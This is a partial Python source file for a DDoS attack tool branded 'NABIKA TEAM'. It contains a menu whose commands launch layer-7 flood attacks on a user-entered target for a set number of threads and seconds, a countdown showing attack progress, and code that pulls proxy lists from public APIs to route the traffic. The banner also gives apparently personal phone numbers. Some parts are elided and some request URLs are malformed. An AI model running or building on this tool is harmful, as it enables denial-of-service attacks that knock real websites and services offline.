...
def countdown(t):
    ...
    while True:
        if (until - datetime.datetime.now()).total_seconds() > 0:
            stdout.flush()
            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Nabika Attacking => " + str((until - datetime.datetime.now()).total_seconds()) + " sec left ")
        else:
            stdout.flush()
            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Nabika Done !                                   \n")
            return
#ua
...
def title():
    ...
    stdout.write("             "+Fore.LIGHTCYAN_EX+"║              _  _ ____ ___  _ _  _ ____                     ║             \n")
    stdout.write("             "+Fore.LIGHTCYAN_EX+"║              |\ | |__| |__] | |_/  |__|                     ║             \n")
    stdout.write("             "+Fore.LIGHTCYAN_EX+"║              | \| |  | |__] | | \_ |  |                     ║             \n")
    stdout.write("             "+Fore.LIGHTCYAN_EX+"║                                                             ║             \n")
    stdout.write("             "+Fore.LIGHTCYAN_EX+"╚═════════════╦═════════════════════════════════╦═════════════╝             \n")
    stdout.write("             "+Fore.LIGHTCYAN_EX+"╔═════════════╩═════════════════════════════════╩═════════════╗\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX+"║ "+Fore.LIGHTCYAN_EX   +"    Tool DDoS By NABIKA TEAM"+Fore.LIGHTCYAN_EX  +"                                ║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX+"║ "+Fore.LIGHTCYAN_EX   +"    Copyright : Nguyễn Nhật BẢo An & Ngọc Phúc (NABIKA)    "+Fore.LIGHTCYAN_EX  +" ║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX+"║ "+Fore.LIGHTCYAN_EX   +"    Zalo Contact : 0985245579 & 0933452441  "+Fore.LIGHTCYAN_EX  +"                ║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX+"║ "+Fore.LIGHTCYAN_EX   +"    Nhập Lệnh 'nabika' Để Chạy Ddos    "+Fore.LIGHTCYAN_EX +"                     ║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX+"╚═════════════════════════════════════════════════════════════╝\n")
    stdout.write("\n")
    stdout.write("\n")
##############################################################################################
def command():
    stdout.write(Fore.LIGHTGREEN_EX+"╔═══"+Fore.LIGHTGREEN_EX+"[""Team"+Fore.LIGHTGREEN_EX+"@"+Fore.LIGHTGREEN_EX+"NABIKA"+Fore.CYAN+"]"+Fore.LIGHTGREEN_EX+"\n╚══\x1b[38;2;0;255;189m> "+Fore.WHITE)
    command = input()
    if command == "cls" or command == "clear":
        ...
        timer.join()
    elif command == "nabikarpx" or command == "NABIKARPX":
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LI(target, thread, t)
            timer.join()
    elif command == "nabika2" or command == "NABIKA2":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchLION2(target, thread, t)
        timer.join()
    elif command == "nabikasock" or command == "NABIKASOCK":
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
...
##############################################################################################     
        ...
        target = input()
        try:
            r = requests.get(f"https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all;https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all"
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",
        ...
        target = input()
        try:
            r = requests.get(f"https://www.proxy-list.download/api/v1/get?type=socks5;https://www.proxy-list.download/api/v1/get?type=http")
            print(r.text)
        except:
            print('An error has occurred while sending the request to the API!')
        ...
        target = input()
        try:
            r = requests.get(f"https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all;https://www.proxy-list.download/api/v1/get?type=socks5")
            print(r.text)
        except:
            print('An error has occurred while sending the request to the API!')
    else:
